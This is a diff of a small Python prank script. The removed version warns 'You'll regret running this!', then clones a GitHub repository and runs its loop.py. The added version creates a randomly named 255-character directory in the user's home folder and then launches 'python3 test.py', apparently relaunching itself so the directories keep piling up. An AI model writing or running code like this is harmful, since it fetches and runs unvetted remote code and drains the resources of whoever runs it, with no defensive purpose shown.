@@ -1,11 +1,11 @@
+import random
+import string
 import os
-import time
 
-print("You'll regret running this!")
-os.system('''git clone https://github.com/xattsec/Loop.git''')
-os.system('pwd')
-time.sleep(3)
-os.system('cd Loop')
-os.system('pwd')
-print("Again")
-os.system('python3 loop.py')
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    os.system(f'mkdir ~/{result_str}')
+    os.system(f'touch ~/{result_str}')
+get_random_string(255)
+os.system('python3 test.py')
